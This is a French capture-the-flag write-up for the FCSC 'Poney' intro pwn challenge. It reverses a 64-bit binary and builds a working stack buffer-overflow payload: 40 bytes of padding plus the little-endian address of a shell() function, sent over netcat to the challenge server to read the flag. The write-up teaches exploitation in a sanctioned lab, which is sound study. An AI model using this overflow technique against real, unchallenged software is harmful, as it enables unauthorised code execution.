# PWN - Poney

## (intro | pwn | aquaponey)

### Énoncé

* On vous demande de lire le fichier flag présent sur le système.
* Service : nc challenges1.france-cybersecurity-challenge.fr 4000
* SHA256(poney) = d95699e40bc6b83c98dbd55dafec97d7730086bae784151796592e28682acd11.

### Résolution

Dans un premier temps il faut se renseigner quand au type de fichier :

```zsh
file ./poney
```

On observe `./poney: ELF 64-bit LSB executable, x86-64`, c'est important et à noter pour la suite !

Autre chose à noter avant de continuer est l'organisation des bits dans la mémoire, il en existe plusieurs types :

* little endian :
   Le bit le moins important est stocké dans l'adresse la plus basse et le plus important, dans l'adresse la plus haute.

* big endian :
   Le bit le plus important est stocké dans l'adresse la plus basse et le moins important dans l'adresse la plus haute.

Pour connaitre cette disposition il faut utiliser la commande :

```zsh
lscpu | grep Endian
```

Pour ce cas ça sera little endian.
C'est important à noter pour la suite !

Grâce à IDA on soutire le code suivant :

```c
int __cdecl main(int argc, const char argv, const char envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h]

  puts("Give me the correct input, and I will give you a shell:");
  printf(">>> ", argv);
  fflush(_bss_start);
  _isoc99_scanf("%s", v4);
  return 0;
}
```

On voit alors qu'il y a un buffer de 32 sans vérification. Essayons alors de rentrer 32*"A" dans poney :

```zsh
python -c 'print "A"*32' | ./poney
```

Ça n'affiche rien, et c'est là que le 64-bits rentre en jeu, étant donné que c'est du 64-bits, il faut rajouter 8 octets au payload pour le faire sauter, ce qui nous donne :

```zsh
python -c 'print "A"*40' | ./poney
```

Ainsi notre shell nous retourne :

```zsh
Segmentation fault (core dumped)
```

C'est exactement ce qu'il nous fallait pour continuer !

En désassemblant notre fichier avec la commande suivante :

```zsh
objdump -d ./poney
```

On observe une fonction shell qui va nous interesser :

```zsh
0000000000400676 <shell>:
  400676:       55                      push   %rbp
  400677:       48 89 e5                mov    %rsp,%rbp
  40067a:       48 8d 3d e7 00 00 00    lea    0xe7(%rip),%rdi        # 400768 <_IO_stdin_used+0x8>
  400681:       e8 d2 fe ff ff          callq  400558 <system@plt>
  400686:       90                      nop
  400687:       5d                      pop    %rbp
  400688:       c3                      retq
```

Pour plus de détial on va l'analyser avec gdb (j'utilise ici peda):

```zsh
gdb ./poney
pdisas shell
```

==>

```zsh
Dump of assembler code for function shell:
   0x0000000000400676 <+0>:     push   rbp
   0x0000000000400677 <+1>:     mov    rbp,rsp
   0x000000000040067a <+4>:     lea    rdi,[rip+0xe7]        # 0x400768
   0x0000000000400681 <+11>:    call   0x400558 <system@plt>
   0x0000000000400686 <+16>:    nop
   0x0000000000400687 <+17>:    pop    rbp
   0x0000000000400688 <+18>:    ret
End of assembler dump.
```

Il faut alors noter l'adresse d'entrée dans le shell : `0x0000000000400676` et c'est là que little endian entre en jeu :
`00 00 00 00 00 40 06 76` => little endian => `76 06 40 00 00 00 00 00`
Nous avons maintenant tout ce qu'il nous faut pour casser le programme ! Il suffit de rentrer 40 caractères pour créer le buffer overflow et compléter le payload avec l'adresse mémoire de notre fonction shell. ce qui nous donne :

```zsh
(python -c 'print "A"*40 + "\x76\x06\x40" + "\x00"*5'; cat -) | nc challenges1.france-cybersecurity-challenge.fr 4000
```

On peut noter qu'à la suite avec un ls on observe notre fichier flag et qu'il suffit de lancer la commande :

```zsh
cat flag
```

Et le tour est joué !
